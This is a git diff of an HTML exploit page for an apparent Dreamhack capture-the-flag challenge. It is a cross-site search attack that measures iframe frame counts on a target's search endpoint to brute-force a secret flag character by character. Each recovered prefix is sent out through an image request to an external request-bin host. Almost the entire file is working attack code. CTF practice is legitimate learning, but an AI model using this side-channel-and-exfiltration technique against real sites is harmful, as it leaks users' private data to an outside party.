@@ -1,16 +1,44 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <meta charset="UTF-8">
-    <title>XS-Search</title>
-  </head>
-  <body>
-    <script>
-      var iframe = document.createElement("iframe");
-      iframe.src = "http://host3.dreamhack.games:15131/search?query=DreamHack";
-      document.body.appendChild(iframe);
-      iframe.onload = ()=>{console.log(iframe.contentWindow.frames.length);};
-    </script>
-  </body>
-</html>
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
+                    return resolve();
+                else
+                    return reject();
+            };
+        });
+    }
+
+    async function search(query) {
+        try {
+            await req(
+              `http://localhost:8000/search?query=${query}`
+            );
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async function exploit() {
+        let chars = "0123456789abcdef}"
+        let secret = "DH{";
+
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) {
+                    secret += c;
+                    img.src = `https://hoelgcy.request.dreamhack.games/${secret}`;
+                    break;
+                }
+            }
+        }
+    }
+
+    exploit();
+</script>
